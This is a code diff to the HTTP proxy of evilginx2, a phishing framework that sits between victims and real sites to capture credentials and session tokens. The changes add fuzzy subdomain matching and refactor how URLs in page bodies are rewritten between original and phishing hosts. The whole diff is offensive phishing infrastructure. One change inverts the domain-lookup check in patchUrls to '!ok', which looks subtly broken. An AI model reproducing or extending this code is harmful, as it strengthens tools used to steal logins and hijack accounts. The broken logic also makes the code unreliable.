@@ -34,7 +34,7 @@ import (
 	"github.com/elazarl/goproxy"
 	"github.com/fatih/color"
 	"github.com/inconshreveable/go-vhost"
-	"github.com/mwitkow/go-http-dialer"
+	http_dialer "github.com/mwitkow/go-http-dialer"
 
 	"github.com/kgretzky/evilginx2/database"
 	"github.com/kgretzky/evilginx2/log"
@@ -771,7 +771,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						// handle auto filters (if enabled)
 						if stringExists(mime, p.auto_filter_mimes) {
 							for _, ph := range pl.proxyHosts {
-								if req_hostname == combineHost(ph.orig_subdomain, ph.domain) {
+								if checkSubFuzzy(req_hostname, ph.orig_subdomain, ph.domain) {
 									if ph.auto_filter {
 										body = p.patchUrls(pl, body, CONVERT_TO_PHISHING_URLS)
 									}
@@ -1032,41 +1032,37 @@ func (p *HttpProxy) patchUrls(pl *Phishlet, body []byte, c_type int) []byte {
 	re_url := regexp.MustCompile(MATCH_URL_REGEXP)
 	re_ns_url := regexp.MustCompile(MATCH_URL_REGEXP_WITHOUT_SCHEME)
 
-	if phishDomain, ok := p.cfg.GetSiteDomain(pl.Name); ok {
-		var sub_map map[string]string = make(map[string]string)
-		var hosts []string
+	if phishDomain, ok := p.cfg.GetSiteDomain(pl.Name); !ok {
+		var replacers []Replacer
 		for _, ph := range pl.proxyHosts {
-			var h string
-			if c_type == CONVERT_TO_ORIGINAL_URLS {
-				h = combineHost(ph.phish_subdomain, phishDomain)
-				sub_map[h] = combineHost(ph.orig_subdomain, ph.domain)
-			} else {
-				h = combineHost(ph.orig_subdomain, ph.domain)
-				sub_map[h] = combineHost(ph.phish_subdomain, phishDomain)
-			}
-			hosts = append(hosts, h)
+			replacers = append(replacers, ph.BuildReplacer(c_type == CONVERT_TO_ORIGINAL_URLS, phishDomain))
 		}
+
 		// make sure that we start replacing strings from longest to shortest
-		sort.Slice(hosts, func(i, j int) bool {
-			return len(hosts[i]) > len(hosts[j])
+		sort.Slice(replacers, func(i, j int) bool {
+			return replacers[i].Size > replacers[j].Size
 		})
 
+		// for each URL in the body:
 		body = []byte(re_url.ReplaceAllStringFunc(string(body), func(s_url string) string {
 			u, err := url.Parse(s_url)
 			if err == nil {
-				for _, h := range hosts {
-					if strings.ToLower(u.Host) == h {
-						s_url = strings.Replace(s_url, u.Host, sub_map[h], 1)
+				for _, r := range replacers {
+					if r.Matches(u.Host) {
+						newHost := r.Apply(u.Host)
+						s_url = strings.Replace(s_url, u.Host, newHost, 1)
 						break
 					}
 				}
 			}
 			return s_url
 		}))
+
+		// for each schemeless URL in the body:
 		body = []byte(re_ns_url.ReplaceAllStringFunc(string(body), func(s_url string) string {
-			for _, h := range hosts {
-				if strings.Contains(s_url, h) && !strings.Contains(s_url, sub_map[h]) {
-					s_url = strings.Replace(s_url, h, sub_map[h], 1)
+			for _, r := range replacers {
+				if r.Matches(s_url) {
+					s_url = r.Apply(s_url)
 					break
 				}
 			}
@@ -1221,7 +1217,7 @@ func (p *HttpProxy) getPhishletByOrigHost(hostname string) *Phishlet {
 	for site, pl := range p.cfg.phishlets {
 		if p.cfg.IsSiteEnabled(site) {
 			for _, ph := range pl.proxyHosts {
-				if hostname == combineHost(ph.orig_subdomain, ph.domain) {
+				if checkSubFuzzy(hostname, ph.orig_subdomain, ph.domain) {
 					return pl
 				}
 			}
@@ -1238,7 +1234,7 @@ func (p *HttpProxy) getPhishletByPhishHost(hostname string) *Phishlet {
 				continue
 			}
 			for _, ph := range pl.proxyHosts {
-				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
+				if checkSubFuzzy(hostname, ph.phish_subdomain, phishDomain) {
 					return pl
 				}
 			}
@@ -1275,8 +1271,8 @@ func (p *HttpProxy) replaceHostWithOriginal(hostname string) (string, bool) {
 				continue
 			}
 			for _, ph := range pl.proxyHosts {
-				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
-					return prefix + combineHost(ph.orig_subdomain, ph.domain), true
+				if checkSubFuzzy(hostname, ph.phish_subdomain, phishDomain) {
+					return prefix + combineFuzzy(hostname, ph.phish_subdomain, ph.orig_subdomain, ph.domain), true
 				}
 			}
 		}
@@ -1303,8 +1299,8 @@ func (p *HttpProxy) replaceHostWithPhished(hostname string) (string, bool) {
 				if hostname == ph.domain {
 					return prefix + phishDomain, true
 				}
-				if hostname == combineHost(ph.orig_subdomain, ph.domain) {
-					return prefix + combineHost(ph.phish_subdomain, phishDomain), true
+				if checkSubFuzzy(hostname, ph.orig_subdomain, ph.domain) {
+					return prefix + combineFuzzy(hostname, ph.orig_subdomain, ph.phish_subdomain, phishDomain), true
 				}
 			}
 		}
@@ -1320,7 +1316,7 @@ func (p *HttpProxy) getPhishDomain(hostname string) (string, bool) {
 				continue
 			}
 			for _, ph := range pl.proxyHosts {
-				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
+				if checkSubFuzzy(hostname, ph.phish_subdomain, phishDomain) {
 					return phishDomain, true
 				}
 			}
@@ -1349,7 +1345,7 @@ func (p *HttpProxy) getPhishSub(hostname string) (string, bool) {
 				continue
 			}
 			for _, ph := range pl.proxyHosts {
-				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
+				if checkSubFuzzy(hostname, ph.phish_subdomain, phishDomain) {
 					return ph.phish_subdomain, true
 				}
 			}
@@ -1366,7 +1362,7 @@ func (p *HttpProxy) handleSession(hostname string) bool {
 				continue
 			}
 			for _, ph := range pl.proxyHosts {
-				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
+				if checkSubFuzzy(hostname, ph.phish_subdomain, phishDomain) {
 					if ph.handle_session || ph.is_landing {
 						return true
 					}
